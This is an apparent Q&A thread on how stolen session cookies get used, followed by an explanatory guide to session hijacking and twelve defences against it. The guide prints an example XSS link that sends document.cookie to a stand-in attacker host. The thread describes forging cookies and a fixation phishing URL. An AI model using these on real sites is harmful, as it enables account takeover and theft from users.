

#########
#########

I have been reading up on session fixing/hijacking recently, and understand the theory.

What I don't understand is how this would be exploited in practice. Would you have to tamper with your browser to make use of the stolen cookies? Append it to the URL and pass it to the web application?

Or would you write some sort of custom script to make use of this, and if so what would it do?

I'm not trying to ask for help with this or examples, but I am trying to learn more and understand. Any help is appreciated.

securitysessionsession-hijacking
Share
Follow
edited Aug 17, 2014 at 20:26
AstroCB's user avatar
AstroCB
12.2k2020 gold badges5858 silver badges7373 bronze badges
asked Dec 1, 2009 at 18:33
Joshxtothe4's user avatar
Joshxtothe4
3,9431010 gold badges5151 silver badges8181 bronze badges
Add a comment
4 Answers
Sorted by:

Highest score (default)

10


Forging a cookie is trivial. As mentioned by Klaus, you can do it right out of your browser.

Here's a practical example of how this could be exploited:

You login to your banking site
Banking site puts a session ID into a cookie, say 123456
Your browser sends the session ID to the server on every request. The server looks at his session store and recognizes you as the user who logged in a little while ago
I somehow gain access to your cookies, or I sniff one of your HTTP requests (impossible with SSL), and find out your session id: 123456
I forge a cookie for your banking site, containing the session ID
Banking site recognizes ME as you, still logged in
I transfer all your funds to my secret account in Switzerland and buy a ridiculously large boat
Of course, in practice there will be more security on high profile sites (for instance, one could check that a session ID never transfers to another client IP address), but this is the gist of how session hijacking works.

Share
Follow
answered Dec 1, 2009 at 18:49
Alexander Malfait's user avatar
Alexander Malfait
2,68111 gold badge2323 silver badges2323 bronze badges
5
"Impossible with SSL" with a sufficiently long (actually secret) key. You could also probably do something with the plain-text-injection-during-renegotiation flaw. – 
Tom Hawtin - tackline
 Dec 1, 2009 at 19:27
3
+1 for "I transfer all your funds to my secret account in Switzerland and buy a ridiculously large boat" :D – 
Wolfer
 Jul 23, 2013 at 9:38
Add a comment

Report this ad

4


If you use firefox there is a plugin called TamperData that lets you change the values of everything that is sent to a server. So if I could read your session cookie, I could basically just go to that site with my firefox and use tamperdata to send it your session cookie value instead of my own, thus hijacking your session.

/Klaus

Share
Follow
answered Dec 1, 2009 at 18:37
Klaus Byskov Pedersen's user avatar
Klaus Byskov Pedersen
114k2828 gold badges183183 silver badges222222 bronze badges
Hi Klaus, I have used TD before, and noticed you had to alter every single request. Acting that slowly seems like it could cause problems, which is why I wondered if there were a more automated way to do so. – 
user1253538
 Dec 1, 2009 at 18:53
The "automated" way would be to edit whatever session cookies there are, and if the page uses GET or POST session information, just substitute that once, and the entire session will be the hijacked one from then on. Just a heads up, every plugin I've ever used for this sort of thing (Tamperdata, LiveHTTPHeaders, various cookie editors) reeks of bugs and annoyances. – 
L̲̳o̲̳̳n̲̳̳g̲̳̳p̲̳o̲̳̳k̲̳̳e̲̳̳
 Dec 1, 2009 at 19:00
Add a comment

2


The internet isn't a magical black box that can only be utilized by browsers in the way the site wants you to.

You can edit your cookies or POST data or GET session variables, or write a simple script to do it. In the end all you're doing is sending HTTP requests and substituting your session data with whatever you want.

Share
Follow
answered Dec 1, 2009 at 18:57
L̲̳o̲̳̳n̲̳̳g̲̳̳p̲̳o̲̳̳k̲̳̳e̲̳̳'s user avatar
L̲̳o̲̳̳n̲̳̳g̲̳̳p̲̳o̲̳̳k̲̳̳e̲̳̳
12.3k44 gold badges4747 silver badges5353 bronze badges
Add a comment

Report this ad

1


Would you have to tamper with your browser to make use of the stolen cookies?

You could, but it would probably be easier just to type javascript:document.cookie='stolencookie=somevalue' in the address bar whilst viewing a page from the target site.

Share
Follow
##
##
##


The Ultimate Guide to Session Hijacking aka Cookie Hijacking

Learn the In’s and Out’s of Session Hijacking and How to Protect Yourself & Your Website Users
Nobody wants to have their precious cookies stolen. And no, we aren’t talking about someone sneaking into your kitchen and emptying the delicious contents of your cookie jar. We’re talking about session hijacking.

It’s a dangerous kind of cyberattack that you could unknowingly be vulnerable to. In fact, a recent Stake study found that 31% of ecommerce applications are vulnerable to session hijacking. Also known as cookie hijacking, session hijacking is a type of attack that could result in a hacker gaining full access to one of your online accounts.

Session hijacking is such a scary concept because of just how many sites we login to each and every day. Take a second and think about how many sites you access daily that require you to login in with a set of credentials. For the vast majority of us, it’s a number that’s much higher than just one or two. It’s also a number that has most likely been steadily growing over time, as more and more online services become a part of our increasingly “connected” lifestyles. And since we store extremely sensitive information all over the place online these days, such as credit card or social security numbers, the effects can be devastating.

So how does session hijacking work exactly? What are the different methods attackers can use to carry it out? And what can you do to protect yourself from their attempts?

Let’s hash it out.

What is a Session?
Before we get into session hijacking, let’s first review what exactly we mean by a “session.”  HTTP is inherently stateless, which means that each request is carried out independently and without any knowledge of the requests that were executed previously. In practical terms, this means that you’d have to enter your username and password again for every page you viewed. As a result, the developers needed to create a way to track the state between multiple connections from the same user, rather than asking them to re-authenticate between each click in a web application.

Sessions are the solution. They act as a series of interactions between two devices, for example your PC and a web server. When you login to an application, a session is created on the server. This maintains the state and is referenced during any future requests you make.

Session Hijacking Session Example
These sessions are used by applications to keep track of user-specific parameters, and they remain active while the user remains logged in to the system. The session is destroyed when you log out, or after a set period of inactivity on your end. At that point, the user’s data is deleted from the allocated memory space.

Session IDs are a key part of this process. They’re a string, usually random and alpha-numeric, that is sent back-and-forth between the server and the client. Depending on how the website is coded, you can find them in cookies, URLs, and hidden fields of websites.

A URL containing a session ID might look like:

www.mywebsite.com/view/99D5953G6027693

On an HTML page, a session ID may be stored as a hidden field:

<input type=”hidden” name=”sessionID” value=”19D5Y3B”>

While Session IDs are quite useful, there are also potential security problems associated with their use. If someone gets your session ID, they can essentially log in to your account on that website.

One common issue is that many sites generate session IDs based on predictable variables like the current time or the user’s IP address, which makes them easy for an attacker to determine. Another issue is that without SSL/TLS, they are transmitted in the open and are susceptible to eavesdropping. And unfortunately, these sorts of vulnerabilities can leave you exposed to session hijacking.

What is Session Hijacking?
Session hijacking occurs when a user session is taken over by an attacker. As we discussed, when you login to a web application the server sets a temporary session cookie in your browser. This lets the remote server remember that you’re logged in and authenticated. Because this kind of attack requires the attacker to have knowledge of your session cookie, it’s also sometimes referred to as cookie hijacking. It’s one of the most popular methods for attacking client authentication on the web.

A hacker needs to know the victim’s session ID to carry out session hijacking. It can be obtained in a few different ways (more on that later), including by stealing the session cookie or by tricking the user into clicking a malicious link that contains a prepared session ID. Either way, the attacker can take control of the session by using the stolen session ID in their own browser session. Basically, the server is fooled into thinking that the attacker’s connection is the same as the real user’s original session.


Once the hacker has hijacked the session, they can do anything that the original user is authorized to do. Depending on the targeted website, this can mean fraudulently purchasing items, accessing detailed personal information that can be used for identity theft, stealing confidential company data, or simply draining your bank account. It’s also an easy way to launch a ransomware attack, as a hacker can steal then encrypt valuable data.

The repercussions can be even worse for larger enterprises because cookies are often used to authenticate users in single sign-on systems (SSO). It means that a successful attack can give the attacker access to multiple web applications at once, including financial systems, customer databases, and storage locations that contain valuable intellectual property. Needless to say, no good comes of session hijacking, regardless of who you are.

So how is session hijacking actually performed? There are a few different approaches available to hackers.

Common Methods of Session Hijacking
Session Fixation
Session fixation attacks exploit the vulnerability of a system that allows someone to fixate (aka find or set) another user’s session ID. This type of attack relies on website accepting session IDs from URLs, most often via phishing attempts. For instance, an attacker emails a link to a targeted user that contains a particular session ID. When the user clicks the link and logs in to the website, the attacker will know what session ID that is being used. It can then be used to hijack the session. The exact sequence of attack is as follows:

An attacker determines that http://www.unsafewebsite.com/ accepts any session identifier and has no security validation.
The attacker sends the victim a phishing email, saying “Hello Mark, check out this new account feature from our bank.”  The link directs the victim to http://unsafewebsite.com/login?SID=123456. In this case, the attacker is attempting to fixate the session ID to 123456.
The victim clicks on the link and the regular login screen pops up. Nothing seems amiss and the victim logs on as normal.
The attacker can now visit http://unsafewebsite.com/?SID=123456 and have full access to the victim’s account.
Session Hijacking Session Fixation Attack
A variation of this attack wouldn’t even require the victim to login to the site. Instead, the attacker would fixate the session so they could spy on the victim and monitor the data they enter. It’s essentially the reverse of the scenario we just discussed. The attacker logs the victim in themselves, then the victim uses the site with the authentication of the attacker. If, for example, the victim decides to buy something, then the attacker can retrieve the credit card details by looking at the historical data for the account.

Session Sniffing
Session sniffing is when a hacker employs a packet sniffer, such as Wireshark, to intercept and log packets as they flow across a network connection.  Session cookies are part of this traffic, and session sniffing allows an attacker to find and steal them.


A common vulnerability that leaves a site open to session sniffing is when SSL/TLS encryption is only used on login pages.  This keeps attackers from viewing a user’s password, but if SSL/TLS isn’t used on the rest of the site then session hijacking can occur. Hackers will be able to use packet sniffing to monitor the traffic of everyone else on the network, which includes session cookies. 

Public Wi-Fi networks are especially vulnerable to this type of session hijacking attack.  A hacker can view most of the network traffic simply by logging on and using a packet sniffer since there is no user authentication for the network. Similarly, a hacker could create their own access point and perform man-in-the-middle attacks to obtain session IDs and carry out session hijacking attacks.

Session Hijacking Session Sniffing Attack
Cross-Site Scripting
A cross-site scripting (XSS) attack fools the user’s machine into executing malicious code, although it thinks it secure because it seemingly comes from a trusted server. When the script runs, it lets the hacker steal the cookie.

Server or application vulnerabilities are exploited to inject client-side scripts (usually JavaScript) into webpages, leading the browser to execute the code when it loads the compromised page. If the server doesn’t set the HttpOnly attribute in session cookies, then malicious scripts can get at your session ID.

An example of a cross-site scripting attack to execute session hijacking would be when an attacker sends out emails with a special link to a known, trusted website. The catch, however, is that the link also contains HTTP query parameters that exploit a known vulnerability to inject a script.

For session hijacking, the code that’s part of the XSS attack could send the victim’s session key to the attacker’s own site. For example:

http://www.yourbankswebsite.com/search?<script>location.href=’http://www.evilattacker.com/hijacker.php?cookie=’+document.cookie;</script>

Here the document.cookie command would read the current session cookie and send it to the attacker via the location.href command. This is a simplified example, and in a real-world attack the link would most likely employ character encoding and/or URL shortening to hide the suspicious portions of the link.

Malware
Malware and other malicious third-party programs can also lead to session hijacking. Hackers design the malware to perform packet sniffing and set it to specifically look for session cookies.  When it finds one, it then steals it and sends it to the attacker.  The malware is basically carrying out an automated session sniffing attack on the user. 

Another more direct method of stealing session IDs is to gain access to the user’s machine, whether via malware or by directly connecting to it locally or remotely.  Then, the attacker can navigate to the temporary local storage folder of the browser, or “cookie jar”, and whichever cookie they want.

Brute Force
Lastly, a hacker can attempt to determine the session ID on their own.  This can be achieved by one of two methods.  First, they can try to guess the session ID.  This can be successful if the session ID is based on an easily predictable variable (as we touched on earlier) such as the user’s IP address or the current time or date.  Sequential session IDs were often used in the early days of the web but are rarely used anymore due to their easily identifiable patterns. 

A brute force attack can also be used, in which an attacker attempts to use various session IDs over and over again from a set list.  This is really only a feasible means of session hijacking if the session ID format consists of a relatively short number of characters.

Both of these methods of attack can be easily mitigated by using the right algorithm for generating session IDs.  By using one that creates lengthy session IDs that consist of random letters and numbers, it will be nearly impossible for a hacker to perform session hijacking on your users.

How to Prevent Session Hijacking
While there are many different ways for hackers to carry out session hijacking attacks, the good news is that there are relatively simple security measures and best practices you can employ to protect yourself.  Different ones protect against different session hijacking methods, so you’ll want to enact as many of them as you can.  Here are some of the most common prevention measures that you’ll want to start with:

1.      Use HTTPS On Your Entire Site 
As we’ve seen, using HTTPS only on login pages won’t keep you fully keep you safe from session hijacking. Use SSL/TLS on your entire site, to encrypt all traffic passed between parties. This includes the session key. HTTPS-everywhere is widely used by major banks and ecommerce systems because it completely prevents sniffing attacks.

2.      Use the Secure Cookie Flag
The secure flag can be set by the application server when sending a new cookie as part of a HTTP response. This tells the user’s browser to only send the cookie via HTTPS – it should never be sent via HTTP. This prevents cookies from being viewed by attackers when they’re being transmitted in clear text.

3.      Use Long and Random Session IDs
By using a long random number or string as the session ID, you’re greatly reducing the risk that it can be guessed via trial and error or a brute force attack.

4.      Regenerate the Session ID After Login
This prevents session fixation because the session ID will be changed after the user logs in. Even if the attacker tricks the user into clicking a link with a fixated session ID, they won’t be able to do anything important. Immediately after login, their fixated session ID will be worthless.

5.      Perform Secondary Checks
Additional checks can help verify the identity of the user. For example, a server can check that the IP address of the user for a particular request matches the IP address used for the previous request. However, it’s worth noting that this specific solution could create issues for those whose IP address changes, and it doesn’t prevent attacks from someone sharing the same IP address.

6.      Change the Cookie Value
There are services that can change the value of the cookie after every request. Technically, since you cannot directly modify a cookie, you’ll actually be creating a new cookie with new values and sending it to the browser to overwrite the old version. This greatly reduces the window in which an attack can occur, and it makes it easier to identify if an attack has taken place. Be aware, however, that two closely timed requests from the same client can possibly lead to a token check error.  In that case, you can instead change the cookie expiration time to the shortest time that won’t cause errors.

7.      Log Out When You’re Done
Play it safe and log out of websites whenever you’re done using them.

8.      Use Anti-Malware
Always use anti-malware software, both on server-side and client-side machines. This will prevent cookie-stealing software from getting on your system.

9.      Do Not Accept Session IDs from GET/POST Variables
Session IDs in URLs (query strings or GET variables) or POST variables make session hijacking easy. As we’ve seen, it’s common for attackers to make links or forms that set these variables.

10.  Only Accept Server-Generated Session IDs
This is a straightforward one. Only accept session IDs from a trusted source, in this case the server.

11.  Time-Out Inactive Sessions
This reduces the window of time for an attack and protects a hacker from accessing a machine that has been left unattended.

12.  Destroy Suspicious Referrers
When a browser visits a page, it will set the Referrer header. This contains the link you followed to get to the page. One way to combat session hijacking is to check the referral heading and delete the session if the user is coming from an outside site.

Cover All Your Bases to Protect from Session Hijacking
As we’ve seen, different security measures will prevent different session hijacking methods. By employing theses settings and best practices together, you’ll ensure that you have the most comprehensive protection against session hijacking.

For example, using HTTPS completely prevents against sniffing-type session hijacking, but it won’t protect if you click a phishing link to a cross-site scripting attack (XSS) or use easily guessable session IDs. A combination of proper security measures and effective training is the only surefire way to stay safe.

HTTPS Prevents Session Hijacking
Site-wide HTTPS is a simple and effective starting point for the prevention of session hijacking.  Image source: Michael Bach.
If you’re looking for the best starting point to protect yourself from session hijacking, site-wide HTTPS is your best and easiest option. Say no to plaintext HTTP and use our tips to stay safe from session hijacking!
